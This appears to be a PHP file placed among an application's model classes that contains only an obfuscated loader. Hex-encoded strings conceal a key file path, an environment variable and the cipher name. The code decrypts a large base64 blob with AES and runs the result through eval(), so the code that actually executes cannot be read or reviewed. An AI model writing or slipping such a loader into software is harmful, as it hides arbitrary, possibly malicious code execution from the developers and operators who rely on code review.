<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Es0xyMo6IGFb7V3BV40OMg==');

$c=base64_decode(

'F9PkaR7bI4UGg+VbYvTa0k8lU1B0Sn597mg0sfm2fsUbA1eyHdoJMijf2geuxn5SJxAm1x4b5vEF' .
'+S03m9W50Sig2P96YDQ4j+v02ZglruXC90JZH6ZrE3uS03zVbuaV7Sv8mEhdy9cPKQyj9Yko3LlA' .
'DxChe9VMD9Egz4gM4JzneQ/YybenAEbVmhf9uO10eBHjq2tAnvB2WjpyMS2N1cTnwlo9R/NFUKjC' .
'3+plBX6GtlLD3jz9pNeqpDK4OARX9fP9YFK6WzI3zgUY/lvdCRjokUzrskC7H0oJK24vtBKEK9Mo' .
'2W80rWcCO2WIecWjRL3XIv8om6Ht6U2mK4a6je2SFoVAPeWqZXGBe6Geg9wVCXbtNs9lyEbO0Xna' .
'uww8zxtYrDYWO+e1DqX0X8byd/tyEnToyln3U8G/mG24yuGWghFUmodDGO0PPHhjl0gF8UuoM6w2' .
'VecoqpBdpJiH4eyOs1W8AR0wZmdiYAsq2KEkLJNk5txU9s7BK7UnkVd5qq1lTmg09XvYtxvflSr5' .
'BUPfdq0MAitBxJtEurAkrIATp0jDFYStPyPWUKH2XqInjn97tjeT+OoKYEWgH9CrnI8gGRd4d9+W' .
'dsOMtiVayX1el4c+3wYDc8Vy0oJgSlojy3co6gqHYoGA4mraSop2pojHzmq+7tGAoBxsbOPXdEIt' .
'6XcZ7xstOuWCX1/jAzvrrJJps2rmJdp2XTlqanFmSKez/m+xSPYxJKjC2w1Gd+B4Hc/T5V3nu+JB' .
'PVmzIdkYybhK9Y4lxb5S9X5sP4OnbT47zJwut0OskuTZsaoFCmGfFlDieH/VYnbGB2HRDih6h5j8' .
'E1RGl4egCZC1Q5RfudWkTJuZJ4eBrpjmrb7V+iQ0rNyJ9FpE/ZaC1lnkpHYK7BsvkVtcEfep1MpP' .
'bo8GjlwlUBeF45nhBOU7Y3xp6Wu1A3bZLClnXZ5u7PpBC8imhIWqWDasYF2a51yjnPjmOb6ata/6' .
'ewdo5/wTCs7vgJAzAWkYt7LRQ20os+FqrXSuNUURsuWlA484+CK5+mOaHUfBVxaVX+kUsSxi0jhn' .
'dLalJW+qWUZVdTdnhyJYWLZbR8XDvQR5rL3wvG0L5GpS8C+5bxr/A5j4nzl+VYzgHjaffdKOfUAg' .
'0gXBs+4rbE3ca2C8ij9Jvnh7xAkPbMlIuSpjIGK7HP5K4YTO2qZ8K0xYL1UCdbnbADxvAalkLRKV'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

